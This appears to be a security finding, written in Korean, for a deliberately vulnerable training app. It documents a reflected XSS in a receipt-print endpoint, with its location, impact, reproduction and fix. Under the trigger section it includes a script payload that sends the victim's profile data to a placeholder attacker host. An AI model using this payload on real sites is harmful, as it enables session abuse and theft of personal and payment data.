# VULN-016 인쇄용 영수증 HTML 반사형 XSS

- 대상 스택: node-express, java-spring (동일)
- 심각도: High
- 분류: A05:2025 Injection (XSS, CWE-79)

## 위치

- `apps/node-express/src/routes/orders.js`, `GET /api/orders/:id/receipt/print` — `req.query.note` 를 이스케이프 없이 HTML 응답 본문에 삽입하고 `res.type('html')` 로 전송.
- `apps/java-spring/.../controller/OrderController.java`, `GET /api/orders/{id}/receipt/print` (`produces = text/html`) — `note` 쿼리 파라미터를 그대로 이어붙인 HTML 문자열 반환.

두 엔드포인트 모두 `requireAuth` + 주문 소유권 검사는 유지("인쇄용 영수증 보기" 기능). 반사되는 것은 `note` 파라미터.

## 트리거 방법

피해자가 아래 링크를 열도록 유도:

```
GET /api/java/orders/1/receipt/print?note=<script>fetch('/api/java/profile').then(r=>r.json()).then(d=>new Image().src='https://<collab>/'+btoa(unescape(encodeURIComponent(JSON.stringify(d)))))</script>
```

`localhost:8090` (SPA와 동일 오리진)에서 피해자 세션 쿠키와 함께 스크립트 실행.

## 영향

- 피해자 세션으로 임의 API 호출: `GET /api/{node,java}/orders/:id` 의 `tossPaymentKey`, `GET /api/.../profile` 의 이름·전화·주소 PII 탈취.
- 관리자를 유인하면 `GET /api/.../admin/users` 전체 PII 덤프 + VULN-013 체이닝.

## 증거 (재현 확인)

2026-09-01, 로컬 재현 확인(`:8090`, `user1`, 소유 주문 #92): `GET /orders/92/receipt/print?note=<script>alert(1)</script>`
응답 HTML에 `<script>alert(1)</script>`가 이스케이프 없이 그대로 삽입됨(최상위 HTML 문서라 실행됨).
피해자 세션에서 열면 그 세션으로 임의 요청(PII·주문 `tossPaymentKey` 유출) 가능.

## 조치 상태: 미조치 (의도된 취약점)

정상 구현은 `note`(및 주문 필드)를 HTML 컨텍스트에 맞게 이스케이프하거나, 영수증을 텍스트/구조화 데이터로만 렌더링.
